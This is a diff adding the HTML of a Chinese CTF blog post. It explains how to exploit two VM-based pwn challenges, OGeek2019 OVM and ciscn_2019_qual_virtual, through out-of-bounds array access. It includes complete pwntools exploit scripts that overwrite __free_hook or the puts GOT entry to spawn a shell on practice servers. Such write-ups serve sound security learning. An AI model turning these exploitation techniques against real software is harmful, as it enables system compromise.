@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>关于vm pwn的学习总结 | ZIKH26's Blog</title><meta name="keywords" content="vm pwn"><meta name="author" content="ZIKH26"><meta name="copyright" content="ZIKH26"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="总结：目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个 [OGeek2019 Final]OVM保护策略 程序逻辑 首先程序申">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于vm pwn的学习总结">
+<meta property="og:url" content="https://zikh26.github.io/posts/ccd7886.html">
+<meta property="og:site_name" content="ZIKH26&#39;s Blog">
+<meta property="og:description" content="总结：目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个 [OGeek2019 Final]OVM保护策略 程序逻辑 首先程序申">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zikh26.github.io/img/17.jpg">
+<meta property="article:published_time" content="2023-05-14T23:36:47.632Z">
+<meta property="article:modified_time" content="2023-05-15T00:55:26.851Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="vm pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zikh26.github.io/img/17.jpg"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="https://zikh26.github.io/posts/ccd7886"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '关于vm pwn的学习总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-15 08:55:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">99</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/17.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ZIKH26's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于vm pwn的学习总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-14T23:36:47.632Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-15T00:55:26.851Z" title="更新于 2023-05-15 08:55:26">2023-05-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">学习总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/ccd7886.html" data-flag-title="关于vm pwn的学习总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个</p>
+<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041849897.png" alt="image-20221204184926728"></p>
+<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041852544.png" alt="image-20221204185221474"></p>
+<p>首先程序申请了一块堆空间，程序结束的时候可以往里面输入东西，然后将其释放掉。随后询问了PC和SP寄存器的值(所谓的寄存器就是在bss段上开辟的一片数组)，而pc和sp在这道题里没有任何用，接着要我们要输入指令的个数。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041923932.png" alt="image-20221204192348862"></p>
+<p>上面代码的注释写的很清楚了，下面的代码在while循环里的部分是处理指令的部分，而最后read函数去往堆块里输入数据，再将这个堆块free掉</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041924716.png" alt="image-20221204192408661"></p>
+<p>在execute函数里将我们输入的每个指令都进行了分析，大概就是用c语言来实现了汇编的指令，首先每个指令都是四字节，最高字节是一个操作码(这个操作码用if来判断，这个指令是干啥的)，然后另外三个字节是操作数，以add指令为例，首先用HIBYTE这个宏判断最高字节是否为0x70，如果是0x70就执行</p>
+<p><code>reg[high]=reg[low]+reg[medium]</code>很明显这是个add指令。通过reg数组以及配合其索引来进行的操作，索引就是指令的各个字节。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041944999.png" alt="image-20221204194431944"></p>
+<p>下面这个指令是将具体的数值赋值给reg数组里的某个元素，只有赋值完毕，上面的add指令才有用</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042032767.png" alt="image-20221204203212704"></p>
+<p>而本题的漏洞则在下面两个指令</p>
+<p>reg[low]的值可以控制，这意味着memory的索引可以溢出，从而去篡改某些指针。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033519.png" alt="image-20221204203332481"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033212.png" alt="image-20221204203341172"></p>
+<p>因为无法篡改got表，所以把利用点放到程序最后往comment的输入上(如下)</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042035714.png" alt="image-20221204203553678"></p>
+<p>如果我们能篡改comment这个指针的话，就意味着程序的最后可以任意地址写，并且还调用了free函数，那就利用数组溢出将comment改成free_hook-8的地址，最后输入字符串&#x2F;bin&#x2F;sh以及system的地址过去，执行free函数的时候则获取shell。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先我们要把free_hook-8的地址写到一个地址上，然后将这个地址利用数组溢出写到comment上。而第一步我们需要做出来一个free_hook-8的地址，考虑到bss段上方是got表，我们利用负数索引就可以实现地址任意读取，这里我读取的是stderr的地址，将其读到了reg[4][5]的位置(因为地址是八字节，而一个数组元素是四字节，所以需要两个数组元素放一个地址)</p>
+<p>而后用add指令将stderr的地址改成free_hook-8，最后将free_hook-8赋值到comment的位置即可。具体情况参考exp</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26005&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">18</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">op,high,medium,low</span>):</span><br><span class="line">    payload=(op&lt;&lt;<span class="number">24</span>)+(high&lt;&lt;<span class="number">16</span>)+(medium&lt;&lt;<span class="number">8</span>)+(low)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"><span class="comment">#create a stderr address in reg array</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>)     <span class="comment">#mov reg[0],26</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[4],memory[reg[2]]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>)     <span class="comment">#mov reg[0],25</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[5],memory[reg[2]]       reg[4][5]---&gt;stderr address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create free_hook address through stderr address</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)     <span class="comment">#mov reg[2],0x10</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)      <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0xc0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)      <span class="comment">#reg[1]=sal reg[2],8</span></span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0xa0</span>)   <span class="comment">#mov reg[2],0xa0</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>)      <span class="comment">#add reg[1],reg[2]</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>)      <span class="comment">#add reg[4],reg[1]              reg[4][5]---&gt;free_hook address-8</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD39</span>)</span><br><span class="line"><span class="comment">#let pointer comment point to free_hook</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)     <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[4]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x7</span>)     <span class="comment">#mov reg[0],9</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[5]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R4: &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;R5: &quot;</span>)</span><br><span class="line">addr2=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">sys_addr=addr1+((addr2)&lt;&lt;<span class="number">32</span>)-<span class="number">0x381410</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042056131.png" alt="image-20221204205650878"></p>
+<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2><h3 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052243919.png" alt="image-20221205224348518"></p>
+<h3 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><h4 id="控制堆块与text-data-stack"><a href="#控制堆块与text-data-stack" class="headerlink" title="控制堆块与text data stack"></a>控制堆块与text data stack</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052246509.png" alt="image-20221205224630447"></p>
+<p>程序最开始分配了data段，text段和stack段。他们实现的方式都是用一个控制堆块来存放申请出来的这个段的指针，而返回的是控制堆块的地址(以stack段举例，如下)</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052248915.png" alt="image-20221205224802845" style="zoom:50%;" />
+
+<p>malloc先是申请了0x10的内存出来，当做控制堆块，而后申请了8*0x40的内存当做stack，将其地址赋给s，而s这个指针存放到了ptr这个控制堆块里，最后返回ptr。</p>
+<h4 id="获取操作码的函数"><a href="#获取操作码的函数" class="headerlink" title="获取操作码的函数"></a>获取操作码的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052250722.png" alt="image-20221205225055604"></p>
+<p>这里的实现思路是检测我们输入的字符串中是否出现了指令字符，比如push pop add等等，然后将对应指令换成操作码来存储到text段上(赋值如下)，40144E函数将ptr[i]存放的机器码给到了a1(text段)</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052252420.png" alt="image-20221205225251375" style="zoom:67%;" />
+
+<p>上面需要注意的是strtok函数，strtok函数会遍历delim中的每一个字符，如果delim中有任何一个字符在第一个参数中出现，那么就会把这个字符当做分隔符进行分割，使用过strtok函数一次后，之后的每次往下分割只需要让第一个参数为NULL即可。</p>
+<h4 id="获取数据的函数"><a href="#获取数据的函数" class="headerlink" title="获取数据的函数"></a>获取数据的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052256437.png" alt="image-20221205225650366"></p>
+<p>这个函数是获取用户输入的每个数据，将其存储到data段上，也是以delim分割(这个data段是和text段以及stack段配套使用的)</p>
+<h4 id="处理指令函数"><a href="#处理指令函数" class="headerlink" title="处理指令函数"></a>处理指令函数</h4><p>这个execute函数可以对之前输入的每个指令进行处理，需要注意的是下面的puts(s)，因为s可控，并且程序可以被篡改got表，所以之后有机会可以考虑将puts的got表劫持为system的地址，从而在此处获取shell</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052258349.png" alt="image-20221205225833308"></p>
+<p>然后下面分析几个典型的函数</p>
+<p>下面这个函数是从a1里面获取一个值，存放到a2指向的位置。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052300547.png" alt="image-20221205230047501"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052303350.png" alt="image-20221205230302286"></p>
+<p>结合上图来说，(get函数)就是从第一个参数中取一个数据放置到v6中，从而识别出不同指令。</p>
+<h5 id="push函数"><a href="#push函数" class="headerlink" title="push函数"></a>push函数</h5><p>接着是push函数，从函数引用这里看出push函数需要一个stack的地址和data地址(如下)</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052306158.png" alt="image-20221205230636113"></p>
+<p>进入内部的话是依次调用了这两个函数，前者是上面分析过的get函数，将data段里的一个数据取出来给v3，而第二个函数是将v3的值赋值给stack，具体内部实现的过程就不放了，因为我分析的不是十分透彻，<strong>我主要是通过动态调试观察函数执行前和执行后stack data text以及寄存器里的变化得出来每个函数的作用</strong></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052307117.png" alt="image-20221205230703076"></p>
+<h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><p>然后是add函数，内部是用了两个get连续从stack里面取两次数据，相加后覆盖了第一个操作数将其放回。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052309678.png" alt="image-20221205230944629"></p>
+<h5 id="save函数"><a href="#save函数" class="headerlink" title="save函数"></a>save函数</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052311263.png" alt="image-20221205231132218"></p>
+<p>发现就一个参数stack(注意这个stack是控制堆块的地址，而控制堆块里存放的地址才是真正指向stack的)</p>
+<p>内部实现如下，先是从stack里取了两个数据，红框里才是最重要的部分，简单分析一下，*(stack+12)是stack中存储元素的个数，再加v2(可控)的值乘以8加上*stack(*stack就是真正stack的地址，而本来的stack是控制堆块的地址)得到最后的地址，save函数就是将v3的值写入最后这个地址里。</p>
+<p>很明显v2是可控的，因此可以利用*stack加上一个可控偏移来实现任意数据写入</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052313057.png" alt="image-20221205231309007"></p>
+<h5 id="load函数"><a href="#load函数" class="headerlink" title="load函数"></a>load函数</h5><p>load函数与save函数相反，它的漏洞最后可以利用为从任意地址读出数据放入栈中(如下)，同样是因为v2可控，这样可以利用*stack加上可控偏移将任意地址(前提是任意地址和*stack存在固定偏移)中的数据读入到栈中</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052320237.png" alt="image-20221205232048187"></p>
+<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>综上所述，我们考虑劫持puts的got表为system地址。先将puts的地址用load读入到stack中再用add函数加上一定的偏移得到system的地址，再利用save函数将system的地址写入到puts的got表。</p>
+<p>调试过程如下：</p>
+<p>下图为正常情况下stack与其控制堆块的关系，可以很明显的看到控制堆块里存放的是stack的指针，如果我们想去篡改got表，第一件事就是要将这个地址修改成got地址附件的地址。</p>
+<blockquote>
+<p>能否直接将控制堆块中存放的地址修改为puts的got地址?</p>
+<p>不能，如果修改后的话，*(stack+12)就会拿到一个超级大的值被当做索引(而这个超级大的值实际上是函数的真实地址)，需要注意的是控制堆块中的地址决定了stack位于何处，如果更改为puts的got地址后，之后的push操作则会对各个函数的got表进行破坏，并且*(stack+12)也会因为过大导致程序崩溃</p>
+</blockquote>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052324075.png" alt="image-20221205232444875"></p>
+<p>所以我们得先把stack迁移到got表附近，这里我迁移到了0x4040d0，这里正好位于了got表的下方(如下图)，并且这个地方正好都是内存为0，当做一个新的stack再好不过。</p>
+<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052330226.png" alt="image-20221205233023770" style="zoom:50%;" />
+
+<p>此时新的stack位于got表下方，我们push进来新的索引，让其为负数，这样就能通过新的stack访问到got表中的数据，将其写到新的stack</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052332630.png" alt="image-20221205233223457"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052333469.png" alt="image-20221205233335216"></p>
+<p>最后执行一次save函数将system的地址写回puts的got表即可</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25001&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your program name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x4019E2</span>,<span class="number">0x401A75</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your instruction:\n&quot;</span>,<span class="string">&quot;push push save push load push add push save&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your stack data:\n&quot;</span>,<span class="string">&quot;4210896 -3 -21 -172800 -21&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052338726.png" alt="image-20221205233853481"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwn学习-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/117214601">(44条消息) OGeek_2019_Final OVM题解___lifanxin的博客-CSDN博客</a></p>
